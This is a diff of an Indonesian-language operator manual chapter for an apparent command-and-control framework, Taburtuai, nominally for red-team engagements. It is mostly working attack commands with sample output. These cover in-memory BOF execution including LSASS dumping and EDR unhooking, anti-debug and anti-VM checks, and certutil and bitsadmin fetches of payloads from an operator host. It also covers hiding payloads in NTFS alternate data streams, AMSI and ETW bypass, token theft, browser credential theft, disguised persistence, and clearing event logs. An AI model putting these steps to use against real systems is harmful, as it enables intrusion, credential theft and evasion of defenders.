@@ -1,265 +1,453 @@
 # 15 — Advanced Techniques
 
-## BOF Execution — Beacon Object File
+## BOF Execution (Beacon Object File)
 
-**BOF (Beacon Object File)** adalah format object file `.o` (COFF format) yang bisa
-dieksekusi langsung di memori tanpa membuat proses baru atau menulis file ke disk.
-Format ini pertama kali dipopulerkan Cobalt Strike dan kompatibel dengan banyak BOF
-publik yang tersedia.
+**BOF (Beacon Object File)** adalah COFF object file (`.o`) yang dieksekusi secara
+in-process oleh agent tanpa spawn proses baru. Format sama dengan yang dipakai Cobalt Strike.
 
-### Kenapa BOF
+**Keuntungan BOF:**
+- Tidak ada proses baru di process list
+- Bisa akses Win32 API dan syscall langsung
+- Tidak perlu tulis file ke disk
+- Compatible dengan ekosistem BOF yang sudah ada
 
-- Eksekusi langsung di memori agent (fileless)
-- Tidak ada proses baru yang dibuat
-- Akses ke Beacon API (BOFContext untuk I/O)
-- Banyak BOF publik tersedia (TrustedSec, BofBeacon, dll)
-- Bypass Application whitelisting dengan sempurna
-
-### Jalankan BOF
-
-```
-taburtuai(IP:PORT) › bof 2703886d /tools/bofs/whoami.o --wait
-```
-
-```
-[+] Loading BOF: whoami.o (12,288 bytes)...
-[+] Executing in-memory...
-[+] Output:
-    CORP\john.doe
-```
-
-### BOF dengan Argumen
-
-```
-# Argumen dipack ke binary file
-bof 2703886d /tools/bofs/inject.o --args-file inject_args.bin --wait
-```
-
-### BOF Publik yang Berguna
-
-| BOF | Fungsi |
-|---|---|
-| `whoami.o` | Get current user context |
-| `ps.o` | List processes (lebih detail dari tasklist) |
-| `netstat.o` | Network connections |
-| `ipconfig.o` | Network interfaces |
-| `reg.o` | Registry operations |
-| `adcs_enum.o` | AD Certificate Services enumeration |
-| `kerberoast.o` | Kerberoasting attack |
-| `portscan.o` | Internal port scanner |
-
----
-
-## OPSEC Controls
-
-### Anti-Debug Detection
-
-Deteksi apakah agent sedang di-debug (oleh analyst atau sandbox).
-
-```
-taburtuai(IP:PORT) › opsec antidebug 2703886d --wait
-```
-
-```
-[+] Anti-debug checks:
-    IsDebuggerPresent         : FALSE  ✓
-    CheckRemoteDebuggerPresent: FALSE  ✓
-    NtQueryInformationProcess : FALSE  ✓
-    Timing check              : PASSED ✓ (no timing anomaly)
-    Parent process check      : PASSED ✓ (parent = explorer.exe)
-    
-[+] No debugger detected. Safe to proceed.
-```
-
-Jika ada debugger: `[!] DEBUGGER DETECTED — Consider aborting or pausing operations.`
-
----
-
-### Anti-VM / Sandbox Detection
-
-Deteksi apakah agent berjalan di virtual machine atau sandbox.
-
-```
-taburtuai(IP:PORT) › opsec antivm 2703886d --wait
-```
-
-```
-[+] Anti-VM checks:
-    CPUID hypervisor bit  : FALSE  ✓
-    VMware artifacts      : FALSE  ✓
-    VirtualBox artifacts  : FALSE  ✓
-    Hyper-V artifacts     : FALSE  ✓
-    QEMU/KVM artifacts    : FALSE  ✓
-    Sandbox indicators    : FALSE  ✓
-    Uptime check          : PASSED ✓ (> 10 min)
-    MAC address check     : PASSED ✓
-    Screen resolution     : PASSED ✓ (1920x1080)
-    
-[+] No VM/sandbox detected. Safe to proceed.
-```
-
-Artifact yang diperiksa:
-- Registry key VMware/VirtualBox
-- Device driver (vmmouse.sys, vmhgfs.sys, vboxguest.sys)
-- MAC address prefix vendor (VMware: 00:0C:29, VBox: 08:00:27)
-- CPU timing attack (RDTSC anomaly)
-- Screen resolution kecil (sandbox biasanya 800x600 atau 1024x768)
-- Jumlah proses sedikit (sandbox biasanya < 20 proses)
-
----
-
-### Timegate — Working Hours Restriction
-
-Batasi operasi agent hanya pada jam kerja tertentu. Agent tidak akan eksekusi perintah
-di luar jam yang dikonfigurasi.
-
-```
-# Set agent aktif hanya jam 08:00 - 18:00
-taburtuai(IP:PORT) › opsec timegate 2703886d --start 8 --end 18 --wait
-```
-
-```
-[+] Timegate configured: 08:00 - 18:00 (local time on target)
-[*] Agent will queue commands but not execute outside working hours.
-```
-
-**Kenapa berguna:**
-- Beacon pattern lebih natural (seperti user kerja biasa)
-- Hindari deteksi anomali dari SOC yang monitor jam kerja
-- Sesuai dengan rules of engagement yang ditetapkan client
-
-### Kill Date
-
-Atur tanggal agent berhenti beroperasi secara otomatis.
-
-```
-# Set kill date (agent mati sendiri setelah tanggal ini)
-opsec timegate 2703886d --kill-date 2026-12-31 --wait
-```
-
-```
-[+] Kill date set: 2026-12-31
-[*] Agent will stop beaconing after this date.
-```
-
-**Best practice:** Selalu set kill date sesuai scope engagement untuk memastikan
-agent tidak hidup lebih lama dari yang diizinkan.
-
----
-
-## Server Management
-
-### Lihat Server Logs
-
-```
-taburtuai(IP:PORT) › logs
-```
-
-```
-[+] Recent server logs (last 20):
-
-2026-04-23 16:30:00  INFO   AGENT     Agent 2703886d checked in (DESKTOP-QLPBF95\windows)
-2026-04-23 16:30:12  INFO   CMD       Queued: execute — whoami (cmd-id: a1b2c3d4)
-2026-04-23 16:30:24  INFO   CMD       Completed: a1b2c3d4 (exit: 0, 1.2s)
-2026-04-23 16:31:00  INFO   AGENT     Agent 2703886d checked in
-2026-04-23 16:35:00  INFO   PERSIST   Setup registry_run 'WindowsDefender' on 2703886d
-2026-04-23 16:35:12  WARN   AUTH      Invalid API key attempt from 10.0.0.5
-```
-
-### Filter Log
-
-```
-# Hanya error
-logs --level error --limit 50
-
-# Dari waktu tertentu
-logs --since "2026-04-23 16:00:00" --limit 100
-
-# Dari agent tertentu
-logs --agent 2703886d --limit 30
-```
-
----
-
-## Operator Console — Tips & Shortcut
-
-### Tab Completion
-
-Di dalam interactive console, tekan `Tab` untuk auto-complete:
-- Nama perintah
-- Flag nama
-
-### History
-
-- Gunakan tombol panah atas/bawah untuk navigasi history perintah
-- History disimpan di `/tmp/.taburtuai_history`
-
-### Prefix ID
-
-```
-# Semua ini valid untuk ID yang sama
-cmd 2703886d "whoami"
-cmd 2703886d-32fb "whoami"
-cmd 2703886d-32fb-4a1c "whoami"
-```
-
-### Verbose Mode
-
-```
-# Aktifkan verbose di console untuk debugging
-taburtuai(IP:PORT) › cmd 2703886d "whoami" -v
-[VERBOSE] POST /api/v1/agent/2703886d.../command {"operation_type":"execute","command":"whoami",...}
-[VERBOSE] Response: {"success":true,"data":{"command_id":"a1b2c3d4..."}}
-[+] Command queued: a1b2c3d4-...
-```
-
-### Versi
-
-```
-taburtuai(IP:PORT) › version
-```
-
-```
-[+] Taburtuai C2
-    Version    : 3.0.0
-    Build      : 2026-04-23
-    Go version : go1.21.5
-```
-
----
-
-## Cleanup Setelah Engagement
-
-Penting: bersihkan semua artefak setelah engagement selesai.
+### Kompilasi BOF
 
 ```bash
-# 1. Hapus persistence
-persistence remove <id> --method registry_run --name "WindowsDefender" --wait
-persistence remove <id> --method schtasks_onlogon --name "UpdateTask" --wait
+# Di mesin Linux dengan MinGW
+x86_64-w64-mingw32-gcc -c dir.c -o dir.o -masm=intel
+```
 
-# 2. Hapus file yang diupload
-cmd <id> "del C:\Temp\*.exe && del C:\Temp\*.dmp && del C:\Temp\*.bin"
+### Upload dan Eksekusi BOF
 
-# 3. Hapus file credentials yang didownload ke server
-cmd <id> "del C:\Windows\Temp\sam_* && del C:\Windows\Temp\system_* && del C:\Windows\Temp\lsass_*"
+```
+taburtuai(IP:8000) › files upload 2703886d ./dir.o "C:\Temp\dir.o" --wait
 
-# 4. Hapus ADS yang dibuat
-cmd <id> "powershell -c \"Remove-Item -Stream 'nc' C:\Windows\System32\calc.exe\""
+taburtuai(IP:8000) › bof 2703886d --file "C:\Temp\dir.o" --wait
+```
 
-# 5. Clear event logs (kalau scope mengizinkan)
-cmd <id> "wevtutil cl System"
-cmd <id> "wevtutil cl Security"
-cmd <id> "wevtutil cl Application"
+**Output:**
+```
+[*] Loading BOF: C:\Temp\dir.o...
+[*] Resolving imports...
+[*] Executing in-process (no new thread)...
+[+] BOF execution completed (0.4s):
 
-# 6. Matikan agent
-cmd <id> "exit" # atau shutdown agent melalui command khusus
+[BOF output]
+Listing C:\:
+  PerfLogs          <DIR>
+  Program Files     <DIR>
+  Program Files (x86) <DIR>
+  Temp              <DIR>
+  Users             <DIR>
+  Windows           <DIR>
+```
 
-# 7. Hapus agent dari database server
-agents delete <id>
+### Eksekusi dengan Arguments
 
-# 8. Hapus stage yang masih aktif
-./bin/operator stage list --server http://IP:PORT
-./bin/operator stage delete TOKEN --server http://IP:PORT
+BOF bisa menerima argumen yang di-pack dalam format binary Cobalt Strike:
+
+```bash
+# Pack arguments (di mesin operator)
+python3 pack_bof_args.py --string "C:\Users" > args.bin
+base64 args.bin > args.b64
+```
+
+```
+taburtuai(IP:8000) › bof 2703886d \
+  --file "C:\Temp\dir.o" \
+  --args-b64 "$(cat args.b64)" \
+  --wait
+```
+
+### BOF yang Umum Dipakai
+
+| BOF | Fungsi | Sumber |
+|-----|--------|--------|
+| `dir.o` | List direktori tanpa cmd | trustedsec/CS-Situational-Awareness-BOF |
+| `whoami.o` | whoami tanpa spawn process | trustedsec/CS-Situational-Awareness-BOF |
+| `arp.o` | ARP table | trustedsec/CS-Situational-Awareness-BOF |
+| `netstat.o` | Active connections | trustedsec/CS-Situational-Awareness-BOF |
+| `ldapsearch.o` | LDAP query langsung | trustedsec/CS-Situational-Awareness-BOF |
+| `nanodump.o` | LSASS dump (PPL bypass) | helpsystems |
+| `unhook.o` | EDR unhooking BOF | rad98/bof-collection |
+
+---
+
+## Registry Operations
+
+Baca, tulis, hapus, dan enumerasi registry keys di Windows target.
+
+### Baca Registry Value
+
+```
+taburtuai(IP:8000) › registry read 2703886d \
+  --hive HKLM \
+  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
+  --value ProductName \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry value:
+
+    Path  : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName
+    Type  : REG_SZ
+    Data  : Windows 11 Home
+```
+
+```
+taburtuai(IP:8000) › registry read 2703886d \
+  --hive HKLM \
+  --key "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" \
+  --value EnableSecuritySignature \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry value:
+
+    Path  : HKLM\SYSTEM\...\EnableSecuritySignature
+    Type  : REG_DWORD
+    Data  : 0x00000001 (1)
+```
+
+### Tulis Registry Value
+
+```
+taburtuai(IP:8000) › registry write 2703886d \
+  --hive HKCU \
+  --key "Software\Microsoft\Windows\CurrentVersion\Policies\System" \
+  --value DisableLockWorkstation \
+  --data 1 \
+  --type dword \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry value written.
+
+    Path  : HKCU\...\DisableLockWorkstation
+    Type  : REG_DWORD
+    Data  : 0x00000001
+```
+
+**Tipe data yang didukung:**
+
+| Flag `--type` | Registry Type | Contoh `--data` |
+|---------------|---------------|-----------------|
+| `sz` | REG_SZ (string) | `"Hello World"` |
+| `dword` | REG_DWORD (32-bit int) | `1` atau `0x1` |
+| `qword` | REG_QWORD (64-bit int) | `1000000` |
+| `binary` | REG_BINARY | `deadbeef` (hex) |
+| `multi` | REG_MULTI_SZ | `val1\0val2\0val3` |
+| `expand` | REG_EXPAND_SZ | `%SystemRoot%\System32` |
+
+### Hapus Registry Value
+
+```
+taburtuai(IP:8000) › registry delete 2703886d \
+  --hive HKCU \
+  --key "Software\Test" \
+  --value MyValue \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry value deleted: HKCU\Software\Test\MyValue
+```
+
+### Hapus Registry Key (dan Semua Subkey)
+
+```
+taburtuai(IP:8000) › registry delete 2703886d \
+  --hive HKCU \
+  --key "Software\Test" \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry key deleted: HKCU\Software\Test (dan semua isinya)
+```
+
+### List Subkeys dan Values
+
+```
+taburtuai(IP:8000) › registry list 2703886d \
+  --hive HKLM \
+  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
+  --wait
+```
+
+**Output:**
+```
+[+] Registry contents:
+
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+│
+├── [VALUE] SecurityHealth        REG_SZ  C:\Windows\system32\SecurityHealthSystray.exe
+├── [VALUE] OneDrive              REG_SZ  "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
+├── [VALUE] MicrosoftEdgeUpdate   REG_SZ  C:\Program Files\Microsoft\Edge\Application\msedge.exe
+└── [VALUE] WindowsSecurityUpdate REG_SZ  C:\Users\john.doe\AppData\Roaming\ws_update.exe
+```
+
+---
+
+## Anti-Debug Check
+
+Deteksi apakah agent berjalan di dalam debugger atau environment analisis.
+
+```
+taburtuai(IP:8000) › opsec antidebug 2703886d --wait
+```
+
+**Output (tidak di-debug):**
+```
+[+] Anti-debug checks completed:
+
+    IsDebuggerPresent       : FALSE ✓
+    CheckRemoteDebugger     : FALSE ✓
+    NtQueryInformationProcess: No debugger ✓
+    Heap flags              : Normal ✓
+    
+[+] CLEAR — tidak terdeteksi debugger aktif.
+```
+
+**Output (ada debugger):**
+```
+[+] Anti-debug checks completed:
+
+    IsDebuggerPresent       : TRUE  ✗  [ALERT]
+    CheckRemoteDebugger     : TRUE  ✗  [ALERT]
+    
+[!] ALERT — Debugger terdeteksi! Rekomendasi: hentikan operasi.
+```
+
+---
+
+## Anti-VM Check
+
+Deteksi apakah agent berjalan di dalam virtual machine atau sandbox.
+
+```
+taburtuai(IP:8000) › opsec antivm 2703886d --wait
+```
+
+**Output (bukan VM):**
+```
+[+] Anti-VM checks completed:
+
+    CPUID hypervisor bit     : FALSE ✓
+    VMWare registry artifacts: Not found ✓
+    VirtualBox drivers       : Not found ✓
+    Hyper-V artifacts        : Not found ✓
+    VM-typical processes     : Not found ✓
+    MAC address vendors      : Normal (not virtualization vendor) ✓
+    Disk model               : Normal ✓
+
+[+] CLEAR — tidak terdeteksi virtual machine.
+```
+
+**Output (berjalan di VM):**
+```
+[+] Anti-VM checks completed:
+
+    CPUID hypervisor bit     : TRUE  ✗  [ALERT]
+    VMWare registry artifacts: Found (VMware, Inc.) ✗  [ALERT]
+    VM-typical processes     : vmtoolsd.exe, vmwaretray.exe ✗  [ALERT]
+
+[!] ALERT — Virtual machine terdeteksi (VMware)!
+[i] Kemungkinan berjalan di sandbox atau analyst machine.
+```
+
+---
+
+## Timegate (Working Hours + Kill Date Runtime)
+
+Konfigurasi jam kerja dan kill date secara runtime (tanpa rebuild agent).
+
+### Set Working Hours
+
+Agent hanya aktif beacon pada jam tertentu — di luar jam tersebut agent tidur.
+
+```
+taburtuai(IP:8000) › opsec timegate 2703886d \
+  --work-start 8 \
+  --work-end 18 \
+  --wait
+```
+
+**Output:**
+```
+[*] Configuring timegate on agent 2703886d...
+[+] Timegate configured.
+
+    Active hours: 08:00 - 18:00 (local time of target machine)
+    Timezone    : DESKTOP-QLPBF95 local time
+    
+[i] Agent akan tidur di luar jam 08:00-18:00 dan tidak mengirim beacon.
+[i] Ini mencegah anomali traffic C2 di luar jam kerja normal.
+```
+
+### Set Kill Date Runtime
+
+```
+taburtuai(IP:8000) › opsec timegate 2703886d \
+  --kill-date 2026-05-31 \
+  --wait
+```
+
+**Output:**
+```
+[+] Kill date set: 2026-05-31
+
+[i] Agent akan berhenti otomatis setelah tanggal tersebut.
+[i] Tidak ada cara untuk membatalkan kill date setelah di-set tanpa rebuild.
+```
+
+### Set Keduanya Sekaligus
+
+```
+taburtuai(IP:8000) › opsec timegate 2703886d \
+  --work-start 9 \
+  --work-end 17 \
+  --kill-date 2026-06-30 \
+  --wait
+```
+
+---
+
+## LOLBin File Fetch
+
+Download file menggunakan binary Windows yang sudah ada (Living-off-the-Land).
+Tidak perlu upload tool download — pakai yang sudah ada di system.
+
+### certutil (Default)
+
+```
+taburtuai(IP:8000) › lolbin fetch 2703886d \
+  --url http://10.10.5.3/tool.exe \
+  --dest "C:\Temp\tool.exe" \
+  --method certutil \
+  --wait
+```
+
+**Output:**
+```
+[*] Fetching http://10.10.5.3/tool.exe via certutil...
+[+] Download completed (2.3s).
+
+    Source : http://10.10.5.3/tool.exe
+    Dest   : C:\Temp\tool.exe
+    Size   : 1,245,184 bytes
+    Method : certutil -urlcache -split -f
+```
+
+### bitsadmin
+
+```
+taburtuai(IP:8000) › lolbin fetch 2703886d \
+  --url http://10.10.5.3/payload.exe \
+  --dest "C:\Users\Public\payload.exe" \
+  --method bitsadmin \
+  --wait
+```
+
+### PowerShell (WebClient/Invoke-WebRequest)
+
+```
+taburtuai(IP:8000) › lolbin fetch 2703886d \
+  --url https://10.10.5.3/script.ps1 \
+  --dest "C:\Temp\script.ps1" \
+  --method powershell \
+  --wait
+```
+
+### curl.exe (Windows 10+)
+
+```
+taburtuai(IP:8000) › lolbin fetch 2703886d \
+  --url http://10.10.5.3/data.bin \
+  --dest "C:\Temp\data.bin" \
+  --method curl \
+  --timeout 120 \
+  --wait
+```
+
+---
+
+## ADS Exec (Alternate Data Stream)
+
+Sembunyikan dan eksekusi payload di Alternate Data Stream NTFS.
+
+### Tulis ke ADS
+
+```
+taburtuai(IP:8000) › files upload 2703886d ./payload.js "C:\Windows\System32\drivers\null.sys:p.js" --wait
+# [+] ADS stream written: C:\Windows\...\null.sys:p.js
+```
+
+### Eksekusi dari ADS
+
+```
+taburtuai(IP:8000) › ads exec 2703886d \
+  --ads-path "C:\Windows\System32\drivers\null.sys:p.js" \
+  --wait
+```
+
+**Output:**
+```
+[*] Executing ADS via wscript.exe...
+[+] ADS exec completed.
+```
+
+---
+
+## Skenario: Post-Exploitation Lengkap
+
+```
+# ── 1. Situational Awareness ──────────────────────────────
+opsec antidebug 2703886d --wait
+opsec antivm    2703886d --wait
+
+# ── 2. Evasion ────────────────────────────────────────────
+bypass amsi   2703886d --wait
+bypass etw    2703886d --wait
+evasion unhook 2703886d --wait
+evasion sleep  2703886d --duration 60 --wait
+
+# ── 3. Privilege Check dan Escalation ─────────────────────
+cmd 2703886d "whoami /priv"
+token list 2703886d --wait
+token steal 2703886d --pid 724 --wait   # impersonate SYSTEM
+
+# ── 4. Credential Access ──────────────────────────────────
+creds lsass 2703886d --output "C:\Temp\w.dmp" --wait
+files download 2703886d "C:\Temp\w.dmp" ./loot/lsass.dmp --timeout 120 --wait
+files delete 2703886d "C:\Temp\w.dmp" --wait
+creds browser 2703886d --wait
+
+# ── 5. Persistence ────────────────────────────────────────
+persistence setup 2703886d --method service --name "WinHTTPSvc" --wait
+persistence setup 2703886d --method schtask --name "OneDriveUpdate" --trigger logon --wait
+
+# ── 6. Lateral Movement ───────────────────────────────────
+netscan 2703886d --targets 192.168.1.0/24 --ports 445,3389,5985 --wait
+socks5 start 2703886d --wait
+# Dari operator: proxychains psexec ke host lain
+
+# ── 7. Timegate (OPSEC) ───────────────────────────────────
+opsec timegate 2703886d --work-start 8 --work-end 18 --kill-date 2026-06-30 --wait
+
+# ── 8. Cover Tracks ───────────────────────────────────────
+cmd 2703886d "wevtutil cl System" --wait
+cmd 2703886d "wevtutil cl Security" --wait
+cmd 2703886d "wevtutil cl Application" --wait
 ```
 
 ---
